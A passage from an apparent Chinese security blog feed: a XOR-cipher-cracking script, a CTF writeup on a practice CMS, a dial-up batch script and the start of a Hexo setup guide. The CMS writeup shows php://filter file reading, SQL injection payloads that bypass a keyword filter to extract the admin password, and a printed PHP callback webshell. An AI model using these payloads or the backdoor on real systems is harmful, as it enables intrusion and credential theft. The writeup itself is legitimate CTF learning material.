class="string">"n"</span>: <span class="number">0.06749</span>, <span class="string">"s"</span>: <span class="number">0.06327</span>, <span class="string">"h"</span>: <span class="number">0.06094</span>, <span class="string">"r"</span>: <span class="number">0.05987</span>, <span class="string">"d"</span>: <span class="number">0.04253</span>,</div><div class="line">                   <span class="string">"l"</span>: <span class="number">0.04025</span>, <span class="string">"c"</span>: <span class="number">0.02782</span>, <span class="string">"u"</span>: <span class="number">0.02758</span>, <span class="string">"m"</span>: <span class="number">0.02406</span>, <span class="string">"w"</span>: <span class="number">0.02360</span>,</div><div class="line">                   <span class="string">"f"</span>: <span class="number">0.02228</span>, <span class="string">"g"</span>: <span class="number">0.02015</span>, <span class="string">"y"</span>: <span class="number">0.01974</span>, <span class="string">"p"</span>: <span class="number">0.01929</span>, <span class="string">"b"</span>: <span class="number">0.01492</span>,</div><div class="line">                   <span class="string">"v"</span>: <span class="number">0.00978</span>, <span class="string">"k"</span>: <span class="number">0.00772</span>, <span class="string">"j"</span>: <span class="number">0.00153</span>, <span class="string">"x"</span>: <span class="number">0.00150</span>, <span class="string">"q"</span>: <span class="number">0.00095</span>,</div><div class="line">                   <span class="string">"z"</span>: <span class="number">0.00074</span>&#125;</div><div class="line">    relative = <span class="number">0.0</span></div><div class="line">    total = <span class="number">0</span></div><div class="line">    fpool = <span class="string">'etaoinshrdlcumwfgypbvkjxqz'</span></div><div class="line">    total = sum(cpool.values())  <span class="comment"># 总和应包括字母和其他可见字符</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cpool.keys():</div><div class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> fpool:</div><div class="line">            relative += frequencies[i] * cpool[i] / total</div><div class="line">    <span class="keyword">return</span> relative</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">analyseFrequency</span><span class="params">(cfreq)</span>:</span></div><div class="line">    key = []</div><div class="line">    <span class="keyword">for</span> posFreq <span class="keyword">in</span> cfreq:</div><div class="line">        mostRelative = <span class="number">0</span></div><div class="line">        <span class="keyword">for</span> keyChr <span class="keyword">in</span> posFreq.keys():</div><div class="line">            r = calCorrelation(posFreq[keyChr])</div><div class="line">            <span class="keyword">if</span> r &gt; mostRelative:</div><div class="line">                mostRelative = r</div><div class="line">                keychar = keyChr</div><div class="line">        key.append(keychar)</div><div class="line"></div><div class="line">    <span class="keyword">return</span> key</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFrequency</span><span class="params">(cipher, keyPoolList)</span>:</span></div><div class="line">    <span class="string">''' 传入的密文作为数字列表处理</span></div><div class="line"><span class="string">        传入密钥的字符集应为列表，依次包含各字节字符集。</span></div><div class="line"><span class="string">            形如[[0x11,0x12],[0x22]]</span></div><div class="line"><span class="string">        返回字频列表，依次为各字节字符集中每一字符作为密钥组成部分时对应的明文字频</span></div><div class="line"><span class="string">            形如[&#123;</span></div><div class="line"><span class="string">                    0x11:&#123;'a':2,'b':3&#125;,</span></div><div class="line"><span class="string">                    0x12:&#123;'e':6&#125;</span></div><div class="line"><span class="string">                 &#125;,</span></div><div class="line"><span class="string">                 &#123;</span></div><div class="line"><span class="string">                    0x22:&#123;'g':1&#125;</span></div><div class="line"><span class="string">                 &#125;]</span></div><div class="line"><span class="string">    '''</span></div><div class="line">    freqList = []</div><div class="line">    keyLen = len(keyPoolList)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(keyLen):</div><div class="line">        posFreq = dict()</div><div class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> keyPoolList[i]:</div><div class="line">            posFreq[k] = dict()</div><div class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> cipher[i::keyLen]:</div><div class="line">                p = chr(k ^ c)</div><div class="line">                posFreq[k][p] = posFreq[k][p] + <span class="number">1</span> <span class="keyword">if</span> p <span class="keyword">in</span> posFreq[k] <span class="keyword">else</span> <span class="number">1</span></div><div class="line">        freqList.append(posFreq)</div><div class="line">    <span class="keyword">return</span> freqList</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">vigenereDecrypt</span><span class="params">(cipher, key)</span>:</span></div><div class="line">    plain = <span class="string">''</span></div><div class="line">    cur = <span class="number">0</span></div><div class="line">    ll = len(key)</div><div class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> cipher:</div><div class="line">        plain += chr(c ^ key[cur])</div><div class="line">        cur = (cur + <span class="number">1</span>) % ll</div><div class="line">    <span class="keyword">return</span> plain</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    ps = []</div><div class="line">    ks = []</div><div class="line">    ss = []</div><div class="line">    ps.extend(xrange(<span class="number">32</span>, <span class="number">127</span>))</div><div class="line">    ks.extend(xrange(<span class="number">0xff</span> + <span class="number">1</span>))</div><div class="line">    ss.extend(xrange(<span class="number">1</span>, <span class="number">14</span>))</div><div class="line">    cipher = getCipher()</div><div class="line"></div><div class="line">    keyPool = getKeyPool(cipher=cipher, stepSet=ss, plainSet=ps, keySet=ks)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> keyPool:</div><div class="line">        freq = getFrequency(cipher, keyPool[i])</div><div class="line">        key = analyseFrequency(freq)</div><div class="line">        plain = vigenereDecrypt(cipher, key)</div><div class="line">        <span class="keyword">print</span> key, plain</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure><h3 id="题目备份"><a href="#题目备份" class="headerlink" title="题目备份"></a>题目备份</h3><figure class="highlight c"><table><tr><td class="code"><pre><div class="line">http:<span class="comment">//ctf.nuptsast.com/static/uploads/13706e3281c1fb0c04417d3452cb745b/encode.cpp</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> KEY_LENGTH 2 <span class="comment">// Can be anything from 1 to 13</span></span></div><div class="line"></div><div class="line">main()&#123;</div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> ch;</div><div class="line">  FILE *fpIn, *fpOut;</div><div class="line">  <span class="keyword">int</span> i;</div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> key[KEY_LENGTH] = &#123;<span class="number">0x00</span>, <span class="number">0x00</span>&#125;;</div><div class="line">  <span class="comment">/* of course, I did not use the all-0s key to encrypt */</span></div><div class="line"></div><div class="line">  fpIn = fopen(<span class="string">"ptext.txt"</span>, <span class="string">"r"</span>);</div><div class="line">  fpOut = fopen(<span class="string">"ctext.txt"</span>, <span class="string">"w"</span>);</div><div class="line"></div><div class="line">  i=<span class="number">0</span>;</div><div class="line">  <span class="keyword">while</span> (<span class="built_in">fscanf</span>(fpIn, <span class="string">"%c"</span>, &amp;ch) != EOF) &#123;</div><div class="line">    <span class="comment">/* avoid encrypting newline characters */</span>  </div><div class="line">    <span class="comment">/* In a "real-world" implementation of the Vigenere cipher, </span></div><div class="line"><span class="comment">       every ASCII character in the plaintext would be encrypted.</span></div><div class="line"><span class="comment">       However, I want to avoid encrypting newlines here because </span></div><div class="line"><span class="comment">       it makes recovering the plaintext slightly more difficult... */</span></div><div class="line">    <span class="comment">/* ...and my goal is not to create "production-quality" code =) */</span></div><div class="line">    <span class="keyword">if</span> (ch!=<span class="string">'\n'</span>) &#123;</div><div class="line">      <span class="built_in">fprintf</span>(fpOut, <span class="string">"%02X"</span>, ch ^ key[i % KEY_LENGTH]); <span class="comment">// ^ is logical XOR    </span></div><div class="line">      i++;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line"> </div><div class="line">  fclose(fpIn);</div><div class="line">  fclose(fpOut);</div><div class="line">  <span class="keyword">return</span>;</div><div class="line">&#125; </div><div class="line">----------------------------------------------------------------------------------</div><div class="line">http:<span class="comment">//ctf.nuptsast.com/static/uploads/9a27a6c8b9fb7b8d2a07ad94924c02e5/code.txt</span></div><div class="line"></div><div class="line">F96DE8C227A259C87EE1DA2AED57C93FE5DA36ED4EC87EF2C63AAE5B9A7EFFD673BE4ACF7BE8923CAB1ECE7AF2DA3DA44FCF7AE29235A24C963FF0DF3CA3599A70E5DA36BF1ECE77F8DC34BE129A6CF4D126BF5B9A7CFEDF3EB850D37CF0C63AA2509A76FF9227A55B9A6FE3D720A850D97AB1DD35ED5FCE6BF0D138A84CC931B1F121B44ECE70F6C032BD56C33FF9D320ED5CDF7AFF9226BE5BDE3FF7DD21ED56CF71F5C036A94D963FF8D473A351CE3FE5DA3CB84DDB71F5C17FED51DC3FE8D732BF4D963FF3C727ED4AC87EF5DB27A451D47EFD9230BF47CA6BFEC12ABE4ADF72E29224A84CDF3FF5D720A459D47AF59232A35A9A7AE7D33FB85FCE7AF5923AA31EDB3FF7D33ABF52C33FF0D673A551D93FFCD33DA35BC831B1F43CBF1EDF67F0DF23A15B963FE5DA36ED68D378F4DC36BF5B9A7AFFD121B44ECE76FEDC73BE5DD27AFCD773BA5FC93FE5DA3CB859D26BB1C63CED5CDF3FE2D730B84CDF3FF7DD21ED5ADF7CF0D636BE1EDB79E5D721ED57CE3FE6D320ED57D469F4DC27A85A963FF3C727ED49DF3FFFDD24ED55D470E69E73AC50DE3FE5DA3ABE1EDF67F4C030A44DDF3FF5D73EA250C96BE3D327A84D963FE5DA32B91ED36BB1D132A31ED87AB1D021A255DF71B1C436BF479A7AF0C13AA14794</div></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://en.wikipedia.org/wiki/Index_of_coincidence" target="_blank" rel="external">https://en.wikipedia.org/wiki/Index_of_coincidence</a></li><li><a href="https://en.wikipedia.org/wiki/One-time_pad" target="_blank" rel="external">https://en.wikipedia.org/wiki/One-time_pad</a></li><li><a href="https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher" target="_blank" rel="external">https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher</a></li><li><a href="https://en.wikipedia.org/wiki/Letter_frequency" target="_blank" rel="external">https://en.wikipedia.org/wiki/Letter_frequency</a></li><li><a href="https://www.lijinma.com/blog/2014/05/29/amazing-xor/" target="_blank" rel="external">https://www.lijinma.com/blog/2014/05/29/amazing-xor/</a></li><li><a href="http://blog.csdn.net/qq_31344951/article/details/77934717" target="_blank" rel="external">http://blog.csdn.net/qq_31344951/article/details/77934717</a></li></ul>]]></content>
    
    <summary type="html">
    
      题目挺不错的，实打实，没脑洞，也锻炼了使用python的能力。
    
    </summary>
    
      <category term="writeup" scheme="https://findneo.github.io/categories/writeup/"/>
    
    
      <category term="ctf" scheme="https://findneo.github.io/tags/ctf/"/>
    
      <category term="密码学" scheme="https://findneo.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>南邮CTF平台综合题2writeup</title>
    <link href="https://findneo.github.io/2017/10/nupt-zonghe2/"/>
    <id>https://findneo.github.io/2017/10/nupt-zonghe2/</id>
    <published>2017-10-04T13:04:34.000Z</published>
    <updated>2017-11-22T10:36:00.138Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>非xss题 但是欢迎留言~<br>地址：<a href="http://cms.nuptzj.cn/" target="_blank" rel="external">get the flag</a></p></blockquote><h2 id="读取源码"><a href="#读取源码" class="headerlink" title="读取源码"></a>读取源码</h2><p>在页面底部发现一个这样的链接：<em><a href="http://cms.nuptzj.cn/about.php?file=sm.txt" target="_blank" rel="external">http://cms.nuptzj.cn/about.php?file=sm.txt</a></em> ，说明题目提供了读取文件功能，如果使用 <em><a href="http://php.net/manual/en/wrappers.file.php" target="_blank" rel="external">file://协议</a></em> 读取，HTML预留字符会以字符实体显示，看起来不方便，所以也可以编码读取后再本地解码。</p><figure class="highlight php"><table><tr><td class="code"><pre><div class="line">http:<span class="comment">//cms.nuptzj.cn/about.php?file=php://filter/convert.base64-encode/resource=filename</span></div><div class="line">在拿到的文件里搜索 <span class="string">".php"</span> ，顺藤摸瓜，能找到并读取到的文件有：</div><div class="line">  sm.txt</div><div class="line">  about.php</div><div class="line">  index.php</div><div class="line">  passencode.php</div><div class="line">  say.php</div><div class="line">  antixss.php</div><div class="line">  so.php</div><div class="line">  preview.php</div><div class="line">  antiinject.php</div><div class="line">  -----------------------------</div><div class="line">  知道有 loginxlcteam目录或文件 和 config.php 但还读不到 ；还不知道有<span class="keyword">list</span>.php ,xlcteam.php</div></pre></td></tr></table></figure><h3 id="关于file-协议"><a href="#关于file-协议" class="headerlink" title="关于file://协议"></a>关于<em>file://协议</em></h3><p> <em>file://协议</em> (<a href="https://tools.ietf.org/html/rfc8089" target="_blank" rel="external">RFC8089</a> )是用来访问本地文件系统的，因为文件系统 是 PHP 使用的默认封装协议，因此在fopen()、 copy()、 file_exists() 、 file_get_contents()和 filesize() 等文件系统函数中是支持的。</p><p>在谷歌/火狐浏览器的URL框里输入  <em>file:///D:/</em>  或者在Linux命令行里敲 <em>lynx file:///</em> 都可以看到效果。</p><p><a href="http://php.net/manual/en/wrappers.file.php#refsect1-wrappers.file-usage" target="_blank" rel="external">PHP文档</a> 提供的用法如下：</p><blockquote><ul><li>/path/to/file.ext</li><li>relative/path/to/file.ext</li><li>fileInCwd.ext</li><li>C:/path/to/winfile.ext</li><li>C:\path\to\winfile.ext</li><li>\smbserver\share\path\to\winfile.ext</li><li>file:///path/to/file.ext</li></ul></blockquote><h3 id="关于PHP的过滤器-php-filter"><a href="#关于PHP的过滤器-php-filter" class="headerlink" title="关于PHP的过滤器(php://filter)"></a>关于PHP的过滤器(<em>php://filter</em>)</h3><p> <a href="http://php.net/manual/en/wrappers.php.php#wrappers.php.filter" target="_blank" rel="external">php://filter</a> 和 <a href="http://php.net/manual/en/filters.php" target="_blank" rel="external">可用的过滤器列表</a>。主要用在数据流内容读取之前做些筛选过滤，可指定过滤器应用在读模式还是写模式，不指定则两者都应用，也可复合使用多个过滤器，使用管道符隔开即可。</p><p>对于CTFer典型的用法像是这样：</p><blockquote><p>php://filter/read= &lt; filter list to apply to read chain &gt;/resource= &lt; stream to be filtered &gt;</p><p>php://filter/read=string.toupper|string.rot13/resource=<a href="https://findneo.github.io/">https://findneo.github.io/</a></p><p>php://filter/convert.base64-encode/resource=filename</p></blockquote><p>常用过滤器列表：</p><ul><li>String Filters<ul><li>string.rot13</li><li>string.toupper</li><li>string.tolower</li><li>string.strip_tags</li></ul></li><li>Conversion Filters<ul><li>convert.base64-encode &amp; convert.base64-decode</li><li>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</li></ul></li><li>Compression Filters</li><li>Encryption Filters</li></ul><h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><p>全局搜索 <em>mysql_query</em> ，发现 <em>say.php,so.php,index.php</em> 都存在数据库操作。选择 <em>so.php</em> 下手。</p><figure class="highlight php"><table><tr><td class="code"><pre><div class="line"><span class="comment">/*so.php*/</span></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]!=<span class="string">"Xlcteam Browser"</span>)&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">'万恶滴黑阔，本功能只有用本公司开发的浏览器才可以用喔~'</span>;</div><div class="line">    <span class="keyword">exit</span>();</div><div class="line">&#125;</div><div class="line">$id=$_POST[<span class="string">'soid'</span>];</div><div class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</div><div class="line"><span class="keyword">include</span> <span class="string">'antiinject.php'</span>;</div><div class="line"><span class="keyword">include</span> <span class="string">'antixss.php'</span>;</div><div class="line">$id=antiinject($id);</div><div class="line">$con = mysql_connect($db_address,$db_user,$db_pass) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"不能连接到数据库！！"</span>.mysql_error());</div><div class="line">mysql_select_db($db_name,$con);</div><div class="line">$id=mysql_real_escape_string($id);</div><div class="line">$result=mysql_query(<span class="string">"SELECT * FROM `message` WHERE display=1 AND id=$id"</span>);</div><div class="line">$rs=mysql_fetch_array($result);</div><div class="line"><span class="keyword">echo</span> htmlspecialchars($rs[<span class="string">'nice'</span>]).<span class="string">':&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;'</span>.antixss($rs[<span class="string">'say'</span>]).<span class="string">'&lt;br /&gt;'</span>;</div><div class="line">mysql_free_result($result);</div><div class="line">mysql_free_result($file);</div><div class="line">mysql_close($con);</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">---------------------------------------------------------------------------------------</div><div class="line"><span class="comment">/*antiinject.php*/</span></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">antiinject</span><span class="params">($content)</span></span>&#123;</div><div class="line">$keyword=<span class="keyword">array</span>(<span class="string">"select"</span>,<span class="string">"union"</span>,<span class="string">"and"</span>,<span class="string">"from"</span>,<span class="string">' '</span>,<span class="string">"'"</span>,<span class="string">";"</span>,<span class="string">'"'</span>,<span class="string">"char"</span>,<span class="string">"or"</span>,<span class="string">"count"</span>,<span class="string">"master"</span>,<span class="string">"name"</span>,<span class="string">"pass"</span>,<span class="string">"admin"</span>,<span class="string">"+"</span>,<span class="string">"-"</span>,<span class="string">"order"</span>,<span class="string">"="</span>);</div><div class="line">$info=strtolower($content);</div><div class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;=count($keyword);$i++)&#123;</div><div class="line"> $info=str_replace($keyword[$i], <span class="string">''</span>,$info);</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> $info;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p> 关注 3、11、14、15行。</p><ol><li><p>burp抓包，修改 <em>User-Agent</em> 字段即可。</p></li><li><p><em>antiinject()</em> 过滤规则是按黑名单<strong><em>依次</em></strong>把关键字删除。</p><ol><li>用黑名单里最后一个关键字 <code>=</code> 分隔即可绕过对多字符关键字的过滤。</li><li>用 <code>/**/</code> 代替空格符。</li><li>单字符关键字不太会弄，也许可以用各种编码绕过，不过我们暂时未必需要，有空格和这些多字符关键字，再加上不在黑名单里的 <code>&lt;&gt;/()</code> 已经可以开始搞事了。</li></ol></li><li><p><em>mysql_real_escape_string()</em> 的功能是对<code>\x00, \n, \r, \, &#39;, &quot; , \x1a(撤销键,ctrl+z)</code> 加反斜杠转义，我们不用这些字符就是了。</p></li><li><p>15行处将处理过的参数直接拼接到查询语句，因为查询结果有多列，又没有逗号可用，不好用内联注入，于是尝试基于逻辑的注入。数据库结构在 <em>sm.txt</em> 已经给出。</p></li><li><figure class="highlight sql"><table><tr><td class="code"><pre><div class="line">我们想要在数据库执行的查询语句是这样：</div><div class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="string">`message`</span> <span class="keyword">WHERE</span> display=<span class="number">1</span> <span class="keyword">AND</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">ascii</span>(<span class="keyword">mid</span>((<span class="keyword">select</span> userpass <span class="keyword">from</span> <span class="keyword">admin</span>)<span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>))&gt;<span class="number">65</span></div><div class="line"></div><div class="line">因为没法用空格，所以实际上是这样：</div><div class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="string">`message`</span> <span class="keyword">WHERE</span> display=<span class="number">1</span> <span class="keyword">AND</span> <span class="keyword">id</span>=   <span class="number">1</span><span class="comment">/**/</span><span class="keyword">and</span><span class="comment">/**/</span><span class="keyword">ascii</span>(<span class="keyword">mid</span>((<span class="keyword">select</span><span class="comment">/**/</span>userpass<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span><span class="keyword">admin</span>)<span class="keyword">from</span><span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">for</span><span class="comment">/**/</span><span class="number">1</span>))&gt;<span class="number">65</span></div><div class="line"></div><div class="line">希望经过过滤的 <span class="keyword">id</span> 值为：</div><div class="line"><span class="number">1</span><span class="comment">/**/</span><span class="keyword">and</span><span class="comment">/**/</span><span class="keyword">ascii</span>(<span class="keyword">mid</span>((<span class="keyword">select</span><span class="comment">/**/</span>userpass<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span><span class="keyword">admin</span>)<span class="keyword">from</span><span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">for</span><span class="comment">/**/</span><span class="number">1</span>))&gt;<span class="number">65</span></div><div class="line"></div><div class="line">向 so.php post过去的参数应该是：</div><div class="line">soid=<span class="number">1</span><span class="comment">/**/</span>an=d<span class="comment">/**/</span><span class="keyword">ascii</span>(<span class="keyword">mid</span>((selec=t<span class="comment">/**/</span>userpas=s<span class="comment">/**/</span>fro=m<span class="comment">/**/</span>admi=n)fro=m<span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span>fo=r<span class="comment">/**/</span><span class="number">1</span>))&gt;<span class="number">65</span></div><div class="line"></div><div class="line">使用burp爆破</div><div class="line">soid=<span class="number">1</span><span class="comment">/**/</span>an=d<span class="comment">/**/</span><span class="keyword">ascii</span>(<span class="keyword">mid</span>((selec=t<span class="comment">/**/</span>userpas=s<span class="comment">/**/</span>fro=m<span class="comment">/**/</span>admi=n)fro=m<span class="comment">/**/</span>§<span class="number">1</span>§<span class="comment">/**/</span>fo=r<span class="comment">/**/</span><span class="number">1</span>))&gt;§<span class="number">65</span>§</div><div class="line">使用 Cluster Bomb 模式，第一个payload 为 [<span class="number">1</span><span class="number">-40</span>] ，第二个为 [<span class="number">31</span>,<span class="number">32</span>,<span class="number">47</span><span class="number">-57</span>](经过几次尝试发现usepass字段只有[ \d] )</div><div class="line">得到[<span class="number">49</span>,<span class="number">48</span>,<span class="number">50</span>,<span class="number">32</span>,<span class="number">49</span>,<span class="number">49</span>,<span class="number">55</span>,<span class="number">32</span>,<span class="number">57</span>,<span class="number">57</span>,<span class="number">32</span>,<span class="number">49</span>,<span class="number">48</span>,<span class="number">55</span>,<span class="number">32</span>,<span class="number">49</span>,<span class="number">49</span>,<span class="number">52</span>,<span class="number">32</span>,<span class="number">48</span>,<span class="number">49</span>,<span class="number">55</span>,<span class="number">32</span>,<span class="number">49</span>,<span class="number">49</span>,<span class="number">48</span>,<span class="number">32</span>,<span class="number">49</span>,<span class="number">49</span>,<span class="number">54</span>,<span class="number">32</span>,<span class="number">49</span>,<span class="number">49</span>,<span class="number">55</span>]</div><div class="line">也就是[<span class="number">102</span> ,<span class="number">117</span> ,<span class="number">99</span> ,<span class="number">107</span> ,<span class="number">114</span> ,<span class="number">117</span> ,<span class="number">110</span> ,<span class="number">116</span> ,<span class="number">117</span>]即funckruntu，访问loginxlcteam登陆即可</div><div class="line"></div><div class="line">进后台得知有管理员留的后门 xlcteam.php ，于是读一下这个文件</div></pre></td></tr></table></figure></li></ol><h2 id="意外"><a href="#意外" class="headerlink" title="意外"></a>意外</h2><p>看别人的writeup时惊喜的发现原来并没有过滤逗号，这意味着可以一次注出来管理员密码！所以深夜里我是有些激动的。</p><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">soid=1/**/an=d/**/0/**/unio=n/**/selec=t/**/null,usernam=e,userpas=s,null/**/fro=m/**/admi=n</div><div class="line"></div><div class="line">//当然，在充分掌握数据库结构前需要一些尝试。</div></pre></td></tr></table></figure><h2 id="使用回调后门"><a href="#使用回调后门" class="headerlink" title="使用回调后门"></a>使用回调后门</h2><p>回调后门似乎是 phithon 师傅最先这样称呼的，在 <a href="https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html" target="_blank" rel="external"><em>创造tips的秘籍——PHP回调后门</em> </a>里做了具体介绍。</p><figure class="highlight php"><table><tr><td class="code"><pre><div class="line"><span class="comment">//xlcteam.php</span></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$e = $_REQUEST[<span class="string">'www'</span>];</div><div class="line">$arr = <span class="keyword">array</span>($_POST[<span class="string">'wtf'</span>] =&gt; <span class="string">'|.*|e'</span>,);</div><div class="line">array_walk($arr, $e, <span class="string">''</span>);</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">  <span class="comment">//使用菜刀连接即可。</span></div><div class="line">  <span class="comment">//url : http://cms.nuptzj.cn/xlcteam.php?www=preg_replace</span></div><div class="line">  <span class="comment">//密码:wtf</span></div></pre></td></tr></table></figure><p>菜刀连上后拿到所有文件，发现 config.php 里有数据库配置，于是就可以操作整个数据库了。</p><p>是的，中午吃的是美味的黄焖鸡 \o/</p><p><img src="cmsnupt.png" alt=""></p><p><img src="arlogined.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      通过SQL注入得到后台登陆密码，连接管理员自用的回调后门。
    
    </summary>
    
      <category term="writeup" scheme="https://findneo.github.io/categories/writeup/"/>
    
    
      <category term="ctf" scheme="https://findneo.github.io/tags/ctf/"/>
    
      <category term="sqli" scheme="https://findneo.github.io/tags/sqli/"/>
    
  </entry>
  
  <entry>
    <title>命令行拨号上网</title>
    <link href="https://findneo.github.io/2017/10/cmd-surfnet/"/>
    <id>https://findneo.github.io/2017/10/cmd-surfnet/</id>
    <published>2017-10-03T15:52:02.000Z</published>
    <updated>2017-11-22T10:36:00.093Z</updated>
    
    <content type="html"><![CDATA[<p>校园网使用PPPoE拨号上网，每次都通过图形化界面通断网络不太方便，希望能一键上网一键下线，于是写了个小脚本。</p><p>配置好相关参数后保存为  <code>C:\Windows\System32\surf.bat</code> ，重启命令行即可使用 <code>surf</code> 命令通断网络，常用的话甚至只要 <code>win+r-&gt;enter</code>就可以自由迅速地上线下线啦。把下面第二十行的注释去掉可以在联网同时打开ss，有些缺憾的是还没有实现断网时退出ss。</p><p>流程控制参考了<a href="http://www.infionline.net/~wtnewton/batch/batguide.html#8" target="_blank" rel="external">Batch Guide by Terry Newton</a> 。</p><figure class="highlight c"><table><tr><td class="code"><pre><div class="line">REM 校园网使用PPPoE拨号上网，将文件内容存为 C:\Windows\System32\surf.bat ，可以命令行拨号上网</div><div class="line">REM 可自行加开ss</div><div class="line">@echo off</div><div class="line"><span class="built_in">set</span> name=net   REM 修改net 为拨号连接的名字</div><div class="line"><span class="built_in">set</span> phone=<span class="number">13323333333</span>   REM 修改为拨号上网手机号</div><div class="line"><span class="built_in">set</span> pass=<span class="number">2333</span>    REM    运营商提供的密码</div><div class="line"></div><div class="line">rasdial | findstr 已连接 &gt; nul</div><div class="line"><span class="keyword">if</span> errorlevel <span class="number">1</span> <span class="keyword">goto</span> notfound</div><div class="line"></div><div class="line">rem <span class="built_in">string</span> was found</div><div class="line">rasdial %name% /disconnect </div><div class="line"></div><div class="line"><span class="keyword">goto</span> endfind</div><div class="line"></div><div class="line">:notfound</div><div class="line">rem <span class="built_in">string</span> was <span class="keyword">not</span> found</div><div class="line">rasdial %name% %phone% %pass%</div><div class="line"><span class="keyword">if</span> <span class="string">"%1"</span> neq <span class="string">""</span> <span class="keyword">goto</span> :endfind</div><div class="line">REM start C:\path\to\your\Shadowsocks\Shadowsocks.exe</div><div class="line">:endfind</div></pre></td></tr></table></figure><p>2017/10/05 更新代码：</p><p>添加第十九行，如果ss已经在运行，只要传入一个参数就不会尝试开启啦。</p>]]></content>
    
    <summary type="html">
    
      解放鼠标，从命令行连接与断开网络
    
    </summary>
    
      <category term="备忘" scheme="https://findneo.github.io/categories/%E5%A4%87%E5%BF%98/"/>
    
    
      <category term="hacklife" scheme="https://findneo.github.io/tags/hacklife/"/>
    
      <category term="code" scheme="https://findneo.github.io/tags/code/"/>
    
      <category term="Batch" scheme="https://findneo.github.io/tags/Batch/"/>
    
  </entry>
  
  <entry>
    <title>博客搭建与自定义</title>
    <link href="https://findneo.github.io/2017/09/hexo-config/"/>
    <id>https://findneo.github.io/2017/09/hexo-config/</id>
    <published>2017-09-26T10:29:02.000Z</published>
    <updated>2017-11-22T10:36:00.117Z</updated>
    
    <content type="html"><![CDATA[<p>利用GitHub page和hexo搭建一个个人博客主要分三步：</p><ol><li>使用hexo在本地搭建一个可访问的博客。</li><li>自定义博客样式。</li><li>将博客发布到GitHub page。</li></ol><h3 id="hexo本地搭建可访问博客"><a href="#hexo本地搭建可访问博客" class="headerlink" title="hexo本地搭建可访问博客"></a>hexo本地搭建可访问博客</h3><p><a href="https://hexo.io/zh-cn/docs/index.html" target="_blank" rel="external">官方文档</a>讲的很详细了。</p><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">#</span>基于Windows 10 ; hexo: 3.3.9 ; next Release 5.0.0</div><div class="line"></div><div class="line"><span class="meta">#</span>1.安装 Node.js (https://nodejs.org/en/download/)</div><div class="line"></div><div class="line"><span class="meta">#</span>2.安装 Git for Windows (https://github.com/waylau/git-for-win)</div><div class="line"></div><div class="line"><span class="meta">#</span>3.安装 hexo</div><div class="line"><span class="meta">#</span>  打开cmd.exe</div><div class="line">npm install -g hexo-cli</div><div class="line"></div><div class="line"><span class="meta">#</span>4. 创建博客</div><div class="line"><span class="meta">#</span>  进入想要放博客文件的目录</div><div class="line">hexo init &lt;folder&gt;</div><div class="line">cd &lt;folder&gt;</div><div class="line">npm install</div><div class="line"><span class="meta">#</span> 到此为止已经可以看到效果</div><div class="line"><span class="meta">#</span> hexo clean;hexo g;hexo s [--debug]</div><div class="line"></div><div class="line"><span class="meta">#</span>5. 自选主题，如next (http://theme-next.iissnan.com/getting-started.html)</div><div class="line">cd themes</div><div class="line">git clone https://github.com/iissnan/hexo-theme-next themes/next</div><div class="line"></div><div class="line"><span class="meta">#</span> 